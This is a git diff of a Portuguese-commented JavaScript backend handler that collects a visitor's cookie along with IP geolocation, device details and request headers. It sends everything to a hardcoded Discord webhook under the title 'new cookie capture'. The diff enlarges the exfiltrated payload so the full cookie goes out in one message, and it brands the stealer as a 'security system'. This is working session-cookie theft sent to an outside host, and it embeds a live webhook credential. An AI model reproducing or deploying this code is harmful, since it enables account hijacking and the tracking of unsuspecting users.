@@ -31,13 +31,37 @@ export default async function handler(req, res) {
       console.error('Erro ao buscar info do IP:', e);
     }
 
-    // SUA WEBHOOK AQUI - SEGURA NO BACKEND
+    // Buscar informações de geolocalização mais detalhadas (opcional)
+    let geoInfo = {};
+    try {
+      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+      geoInfo = await geoResponse.json();
+    } catch (e) {
+      console.error('Erro ao buscar geo info:', e);
+    }
+
+    // Extrair informações do User-Agent
+    const ua = req.headers['user-agent'] || '';
+    const browserInfo = getBrowserInfo(ua);
+    const osInfo = getOSInfo(ua);
+    const deviceInfo = getDeviceInfo(ua);
+    
+    // Capturar todos os headers
+    const headers = req.headers;
+    const acceptLanguage = headers['accept-language'] || 'Desconhecido';
+    const acceptEncoding = headers['accept-encoding'] || 'Desconhecido';
+    const connection = headers['connection'] || 'Desconhecido';
+    const referer = headers['referer'] || 'Desconhecido';
+    const origin = headers['origin'] || 'Desconhecido';
+    const secChUa = headers['sec-ch-ua'] || 'Desconhecido';
+    const secChUaMobile = headers['sec-ch-ua-mobile'] || 'Desconhecido';
+    const secChUaPlatform = headers['sec-ch-ua-platform'] || 'Desconhecido';
+
+    // WEBHOOK DO DISCORD
     const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
 
-    // 🔥 ENVIAR COOKIE COMPLETO - Dividido se necessário 🔥
-    
-    // PRIMEIRA MENSAGEM: Informações principais + parte do cookie
-    const mainEmbed = {
+    // 🔥 ENVIAR COOKIE COMPLETO + TODAS AS INFORMAÇÕES 🔥
+    const embed = {
       content: '@everyone',
       embeds: [{
         title: '🔐 **NOVA CAPTURA DE COOKIE**',
@@ -45,23 +69,27 @@ export default async function handler(req, res) {
         color: 0x6366f1,
         fields: [
           {
-            name: '🍪 **COOKIE (Parte 1)**',
-            value: '```' + cookie.substring(0, 950) + '```'
+            name: '🍪 **COOKIE COMPLETO**',
+            value: '```' + cookie + '```'
           },
           {
             name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
             value: `\`\`\`yml
 Dispositivo: ${device}
-Navegador: ${getBrowserInfo(req)}
-Sistema: ${getOSInfo(req)}
-Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
+Tipo: ${deviceInfo}
+Navegador: ${browserInfo.nome} ${browserInfo.versao}
+Sistema: ${osInfo.nome} ${osInfo.versao}
+Idioma: ${acceptLanguage}
+Engine: ${browserInfo.engine}
+Modo: ${secChUaMobile === '?0' ? 'Desktop' : 'Mobile'}
+Plataforma: ${secChUaPlatform}
 \`\`\``
           },
           {
             name: '🌍 **INFORMAÇÕES DO IP**',
             value: `\`\`\`yml
 IP: ${ip}
-País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
+País: ${ipInfo.country || 'Desconhecido'} (${ipInfo.countryCode || ''})
 Região: ${ipInfo.regionName || 'Desconhecido'}
 Cidade: ${ipInfo.city || 'Desconhecido'}
 CEP: ${ipInfo.zip || 'Desconhecido'}
@@ -70,14 +98,33 @@ Longitude: ${ipInfo.lon || 'Desconhecido'}
 Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
 Provedor: ${ipInfo.isp || 'Desconhecido'}
 Organização: ${ipInfo.org || 'Desconhecido'}
+ASN: ${ipInfo.as || 'Desconhecido'}
 Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
 Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
 Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
+Moeda: ${geoInfo.currency || 'Desconhecido'}
+Código Postal: ${geoInfo.postal || 'Desconhecido'}
+\`\`\``
+          },
+          {
+            name: '🔧 **HEADERS DA REQUISIÇÃO**',
+            value: `\`\`\`yml
+Accept-Language: ${acceptLanguage}
+Accept-Encoding: ${acceptEncoding}
+Connection: ${connection}
+Referer: ${referer}
+Origin: ${origin}
+Sec-CH-UA: ${secChUa}
 \`\`\``
           },
           {
             name: '⏰ **TIMESTAMP**',
-            value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
+            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+            inline: true
+          },
+          {
+            name: '📅 **DATA COMPLETA**',
+            value: `\`${new Date().toLocaleString('pt-BR')}\``,
             inline: true
           },
           {
@@ -89,10 +136,19 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
             name: '📏 **TAMANHO DO COOKIE**',
             value: `\`${cookie.length} caracteres\``,
             inline: true
+          },
+          {
+            name: '🔐 **SEGURANÇA**',
+            value: `\`\`\`yml
+HTTPS: ${req.headers['x-forwarded-proto'] === 'https' ? 'Sim' : 'Não'}
+Cloudflare: ${req.headers['cf-ray'] ? 'Sim' : 'Não'}
+IP Confiável: ${ipInfo.hosting ? 'Não (Hosting)' : 'Sim'}
+Risco: ${ipInfo.proxy ? 'ALTO (Proxy/VPN)' : 'Baixo'}
+\`\`\``
           }
         ],
         footer: {
-          text: 'Aurora Security System • Continuando...',
+          text: 'Aurora Security System • Proteção Avançada • v2.0',
           icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
         },
         timestamp: new Date().toISOString(),
@@ -102,75 +158,11 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
       }]
     };
 
-    // Enviar primeira mensagem
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(mainEmbed)
-    });
-
-    // Se o cookie for maior que 950 caracteres, enviar o resto em mensagens adicionais
-    if (cookie.length > 950) {
-      let parteAtual = 2;
-      let posicao = 950;
-      
-      while (posicao < cookie.length) {
-        const tamanhoParte = Math.min(1900, cookie.length - posicao);
-        const parteCookie = cookie.substring(posicao, posicao + tamanhoParte);
-        
-        const parteEmbed = {
-          embeds: [{
-            title: `🍪 **COOKIE (Parte ${parteAtual})**`,
-            description: '```' + parteCookie + '```',
-            color: 0x6366f1,
-            footer: {
-              text: `Parte ${parteAtual} de ${Math.ceil(cookie.length / 1900) + 1}`
-            }
-          }]
-        };
-
-        await fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(parteEmbed)
-        });
-
-        posicao += tamanhoParte;
-        parteAtual++;
-        
-        // Pequeno delay para não floodar
-        await new Promise(resolve => setTimeout(resolve, 500));
-      }
-    }
-
-    // MENSAGEM FINAL: Resumo
-    const totalPartes = Math.ceil(cookie.length / 1900) + 1;
-    const finalEmbed = {
-      embeds: [{
-        title: '✅ **COOKIE RECEBIDO COM SUCESSO**',
-        color: 0x10b981,
-        fields: [
-          {
-            name: '📊 **RESUMO**',
-            value: `\`\`\`yml
-Total de partes: ${totalPartes}
-Tamanho total: ${cookie.length} caracteres
-Primeiros 50 chars: ${cookie.substring(0, 50)}...
-\`\`\``
-          }
-        ],
-        footer: {
-          text: 'Aurora Security System • Cookie completo enviado!',
-          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
-        },
-        timestamp: new Date().toISOString()
-      }]
-    };
-
+    // Enviar para o Discord
     const response = await fetch(webhookURL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(finalEmbed)
+      body: JSON.stringify(embed)
     });
 
     if (!response.ok) {
@@ -185,25 +177,101 @@ Primeiros 50 chars: ${cookie.substring(0, 50)}...
   }
 }
 
-// Funções auxiliares
-function getBrowserInfo(req) {
-  const ua = req.headers['user-agent'] || '';
-  if (ua.includes('Chrome')) return 'Google Chrome';
-  if (ua.includes('Firefox')) return 'Mozilla Firefox';
-  if (ua.includes('Safari')) return 'Apple Safari';
-  if (ua.includes('Edge')) return 'Microsoft Edge';
-  if (ua.includes('Opera')) return 'Opera';
-  return 'Desconhecido';
+// Funções auxiliares melhoradas
+function getBrowserInfo(ua) {
+  const info = {
+    nome: 'Desconhecido',
+    versao: 'Desconhecido',
+    engine: 'Desconhecido'
+  };
+
+  // Detectar Chrome
+  if (ua.includes('Chrome') && !ua.includes('Edg')) {
+    info.nome = 'Google Chrome';
+    const match = ua.match(/Chrome\/(\d+\.\d+)/);
+    info.versao = match ? match[1] : 'Desconhecido';
+    info.engine = 'Blink';
+  }
+  // Detectar Firefox
+  else if (ua.includes('Firefox')) {
+    info.nome = 'Mozilla Firefox';
+    const match = ua.match(/Firefox\/(\d+\.\d+)/);
+    info.versao = match ? match[1] : 'Desconhecido';
+    info.engine = 'Gecko';
+  }
+  // Detectar Safari
+  else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+    info.nome = 'Apple Safari';
+    const match = ua.match(/Version\/(\d+\.\d+)/);
+    info.versao = match ? match[1] : 'Desconhecido';
+    info.engine = 'WebKit';
+  }
+  // Detectar Edge
+  else if (ua.includes('Edg')) {
+    info.nome = 'Microsoft Edge';
+    const match = ua.match(/Edg\/(\d+\.\d+)/);
+    info.versao = match ? match[1] : 'Desconhecido';
+    info.engine = 'Blink';
+  }
+  // Detectar Opera
+  else if (ua.includes('OPR') || ua.includes('Opera')) {
+    info.nome = 'Opera';
+    const match = ua.match(/(OPR|Opera)\/(\d+\.\d+)/);
+    info.versao = match ? match[2] : 'Desconhecido';
+    info.engine = 'Blink';
+  }
+
+  return info;
 }
 
-function getOSInfo(req) {
-  const ua = req.headers['user-agent'] || '';
-  if (ua.includes('Windows')) return 'Windows';
-  if (ua.includes('Mac OS')) return 'macOS';
-  if (ua.includes('Linux')) return 'Linux';
-  if (ua.includes('Android')) return 'Android';
-  if (ua.includes('iOS')) return 'iOS';
-  return 'Desconhecido';
+function getOSInfo(ua) {
+  const info = {
+    nome: 'Desconhecido',
+    versao: 'Desconhecido'
+  };
+
+  if (ua.includes('Windows NT 10.0')) {
+    info.nome = 'Windows';
+    info.versao = '10/11';
+  } else if (ua.includes('Windows NT 6.3')) {
+    info.nome = 'Windows';
+    info.versao = '8.1';
+  } else if (ua.includes('Windows NT 6.2')) {
+    info.nome = 'Windows';
+    info.versao = '8';
+  } else if (ua.includes('Windows NT 6.1')) {
+    info.nome = 'Windows';
+    info.versao = '7';
+  } else if (ua.includes('Mac OS X')) {
+    info.nome = 'macOS';
+    const match = ua.match(/Mac OS X (\d+[._]\d+[._]\d+)/);
+    info.versao = match ? match[1].replace(/_/g, '.') : 'Desconhecido';
+  } else if (ua.includes('Linux')) {
+    info.nome = 'Linux';
+    if (ua.includes('Android')) {
+      info.nome = 'Android';
+      const match = ua.match(/Android (\d+\.\d+)/);
+      info.versao = match ? match[1] : 'Desconhecido';
+    } else if (ua.includes('iPhone') || ua.includes('iPad')) {
+      info.nome = 'iOS';
+      const match = ua.match(/OS (\d+_\d+)/);
+      info.versao = match ? match[1].replace(/_/g, '.') : 'Desconhecido';
+    }
+  }
+
+  return info;
+}
+
+function getDeviceInfo(ua) {
+  if (ua.includes('Mobile')) {
+    if (ua.includes('iPhone')) return 'iPhone';
+    if (ua.includes('iPad')) return 'iPad';
+    if (ua.includes('Android')) return 'Android Smartphone';
+    return 'Celular';
+  }
+  if (ua.includes('Tablet')) return 'Tablet';
+  if (ua.includes('TV')) return 'Smart TV';
+  return 'Computador';
 }
 
 function generateSessionId() {
